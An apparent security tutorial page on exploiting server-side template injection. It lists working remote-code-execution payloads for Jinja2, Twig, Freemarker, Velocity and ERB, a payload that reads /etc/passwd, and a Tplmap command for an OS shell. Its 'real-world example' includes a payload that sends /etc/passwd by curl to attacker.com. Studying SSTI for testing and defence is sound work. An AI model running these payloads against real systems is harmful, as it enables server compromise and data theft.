<h1>Exploiting Server-Side Template Injection (SSTI)</h1>

<div class="definition-box">
  <h2>What is SSTI Exploitation?</h2>
  <p>
    Server-Side Template Injection (SSTI) exploitation involves leveraging
    vulnerabilities in web applications where user input is unsafely embedded
    into server-side templates, allowing attackers to inject malicious template
    code. Once a template engine is identified, attackers craft payloads to
    achieve goals like remote code execution (RCE), data exfiltration, or
    application manipulation, often leading to severe consequences such as full
    server compromise.
  </p>
</div>

<h2>Objectives of SSTI Exploitation</h2>
<p>Attackers exploit SSTI to achieve:</p>
<ol>
  <li>
    <strong>Remote Code Execution (RCE)</strong> - Execute arbitrary system
    commands on the server
  </li>
  <li>
    <strong>Data Exfiltration</strong> - Access sensitive data like
    configuration details or user information
  </li>
  <li>
    <strong>Application Manipulation</strong> - Alter application logic or
    bypass security controls
  </li>
  <li>
    <strong>Denial of Service (DoS)</strong> - Overload the server with
    resource-intensive template operations
  </li>
</ol>

<div class="example-box">
  <h3>Basic Exploitation Example:</h3>
  <p>Consider a vulnerable URL using Jinja2:</p>
  <p><code>https://example.com/display?name=Alice</code></p>
  <p>An attacker confirms SSTI with:</p>
  <p><code>https://example.com/display?name={{7*7}}</code></p>
  <p>Output: <code>49</code></p>
  <p>They escalate to:</p>
  <p><code>https://example.com/display?name={{config.items()}}</code></p>
  <p>This may reveal sensitive configuration data, such as API keys.</p>
</div>

<h2>Exploitation Techniques by Template Engine</h2>
<p>
  Exploitation depends on the template engine and its environment. Below are
  techniques for common engines.
</p>

<h3>Jinja2 (Python)</h3>
<p>
  Jinja2, used in Flask and Django, allows access to Python objects, enabling
  RCE and data extraction.
</p>
<ul>
  <li>
    <strong>Access Python objects</strong> - Use <code>__class__</code>,
    <code>__mro__</code>, or <code>__subclasses__</code> to reach dangerous
    classes
  </li>
  <li>
    <strong>Execute system commands</strong> - Access <code>os.system</code> or
    <code>subprocess</code>
  </li>
  <li>
    <strong>Read sensitive data</strong> - Extract <code>config</code> or global
    variables
  </li>
</ul>

<div class="example-box">
  <h3>Jinja2 RCE Example:</h3>
  <p>Payload:</p>
  <p>
    <code
      >{{
      ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('whoami')
      }}</code
    >
  </p>
  <p>
    Output: The serverâ€™s current user (e.g., <code>www-data</code>), confirming
    RCE.
  </p>
  <p>
    Note: The index <code>[132]</code> may vary depending on the Python version
    and environment.
  </p>
</div>

<h3>Twig (PHP)</h3>
<p>
  Twig, used in Symfony and Drupal, can be exploited to execute PHP code or
  access environment data.
</p>
<ul>
  <li>
    <strong>Access Twig internals</strong> - Use <code>_self</code> or
    <code>app</code> to reach sensitive objects
  </li>
  <li>
    <strong>Execute PHP code</strong> - Leverage undefined filter callbacks or
    PHP functions
  </li>
</ul>

<div class="example-box">
  <h3>Twig Exploitation Example:</h3>
  <p>Payload:</p>
  <p>
    <code>{{ _self.env.registerUndefinedFilterCallback("phpinfo") }}</code>
  </p>
  <p>Output: PHP configuration details, confirming code execution.</p>
  <p>Escalate to:</p>
  <p>
    <code
      >{{ _self.env.registerUndefinedFilterCallback("system")|filter("whoami")
      }}</code
    >
  </p>
  <p>Output: Server user, indicating RCE.</p>
</div>

<h3>Freemarker (Java)</h3>
<p>
  Freemarker, used in Java applications, allows instantiation of Java objects,
  leading to RCE.
</p>
<ul>
  <li>
    <strong>Create Java objects</strong> - Use <code>new()</code> to instantiate
    classes like <code>java.lang.Runtime</code>
  </li>
  <li>
    <strong>Access file system</strong> - Read files via
    <code>freemarker.template.utility.Execute</code>
  </li>
</ul>

<div class="example-box">
  <h3>Freemarker RCE Example:</h3>
  <p>Payload:</p>
  <p><code>${"freemarker.template.utility.Execute"?new()("whoami")}</code></p>
  <p>Output: Server user (e.g., <code>tomcat</code>), confirming RCE.</p>
</div>

<h3>Velocity (Java)</h3>
<p>
  Velocity allows access to Java objects and methods, enabling command
  execution.
</p>
<ul>
  <li>
    <strong>Access Java runtime</strong> - Use <code>$class</code> or
    <code>$context</code> to reach <code>Runtime</code>
  </li>
  <li>
    <strong>Execute commands</strong> - Call <code>exec()</code> on
    <code>Runtime</code>
  </li>
</ul>

<div class="example-box">
  <h3>Velocity RCE Example:</h3>
  <p>Payload:</p>
  <p>
    <code
      >#set($rt = $class.forName('java.lang.Runtime'))
      $rt.getRuntime().exec('whoami')</code
    >
  </p>
  <p>Output: Server user, confirming RCE.</p>
</div>

<h3>ERB (Ruby)</h3>
<p>ERB, used in Ruby on Rails, allows Ruby code execution within templates.</p>
<ul>
  <li>
    <strong>Execute Ruby code</strong> - Inject arbitrary Ruby expressions
  </li>
  <li>
    <strong>Access system commands</strong> - Use <code>system</code> or
    backticks
  </li>
</ul>

<div class="example-box">
  <h3>ERB RCE Example:</h3>
  <p>Payload:</p>
  <p><code><%= `whoami` %></code></p>
  <p>Output: Server user, confirming RCE.</p>
</div>

<h2>Advanced Exploitation Techniques</h2>
<p>Attackers use advanced methods to maximize impact:</p>
<ul>
  <li>
    <strong>Sandbox bypass</strong> - Circumvent template engine restrictions
    using obscure methods or class chains
  </li>
  <li>
    <strong>File access</strong> - Read sensitive files like
    <code>/etc/passwd</code> or configuration files
  </li>
  <li>
    <strong>Network interaction</strong> - Exfiltrate data to a controlled
    server
  </li>
  <li>
    <strong>Privilege escalation</strong> - Exploit misconfigurations to gain
    higher privileges
  </li>
</ul>

<div class="example-box">
  <h3>Jinja2 File Read Example:</h3>
  <p>Payload:</p>
  <p>
    <code
      >{{
      ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['open']('/etc/passwd').read()
      }}</code
    >
  </p>
  <p>
    Output: Contents of <code>/etc/passwd</code>, exposing system user
    information.
  </p>
</div>

<h2>Real-World Example</h2>
<p>A real-world SSTI exploitation case:</p>
<ol>
  <li>A web application used Jinja2 for user-customizable dashboards</li>
  <li>
    An attacker injected: <code>{{7*7}}</code>, confirming SSTI with output
    <code>49</code>
  </li>
  <li>
    They escalated to: <code>{{config.items()}}</code>, exposing database
    credentials
  </li>
  <li>
    Using:
    <code
      >{{
      ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('curl
      http://attacker.com?data=`cat /etc/passwd`') }}</code
    >
  </li>
  <li>The attacker exfiltrated sensitive files to their server</li>
  <li>The breach led to full server compromise</li>
</ol>

<div class="danger-box">
  <h3>High Impact</h3>
  <p>
    SSTI exploitation often results in catastrophic consequences due to its
    ability to execute arbitrary code. Even sandboxed environments may be
    bypassed with sophisticated payloads, making thorough testing and mitigation
    critical.
  </p>
</div>

<h2>Automating SSTI Exploitation</h2>
<p>Attackers automate exploitation to scale attacks:</p>
<ul>
  <li>
    <strong>Tools like Tplmap</strong> - Automate payload injection and engine
    detection
  </li>
  <li>
    <strong>Custom scripts</strong> - Iterate through class chains or file paths
  </li>
  <li>
    <strong>Burp Suite extensions</strong> - Chain SSTI payloads with other
    attacks
  </li>
</ul>

<div class="example-box">
  <h3>Tplmap Example:</h3>
  <p>Command:</p>
  <p>
    <code
      >python tplmap.py -u "https://example.com/display?name=*" --os-shell</code
    >
  </p>
  <p>Result: An interactive shell on the server, allowing command execution.</p>
</div>

<h2>Mitigating Exploitation During Testing</h2>
<p>Ethical testers should:</p>
<ol>
  <li>
    <strong>Avoid destructive payloads</strong> - Use non-invasive payloads like
    <code>{{config.items()}}</code>
  </li>
  <li>
    <strong>Test in staging environments</strong> - Avoid live systems unless
    authorized
  </li>
  <li>
    <strong>Document payloads</strong> - Record inputs and outputs for reporting
  </li>
  <li>
    <strong>Coordinate with stakeholders</strong> - Follow responsible
    disclosure protocols
  </li>
</ol>
s

<div class="danger-box">
  <h3>Responsible Exploitation</h3>
  <p>
    Uncontrolled SSTI exploitation can cause unintended damage, such as data
    loss or service disruption. Ethical hackers must exercise caution, using
    minimal payloads to confirm vulnerabilities without harming the system.
  </p>
</div>
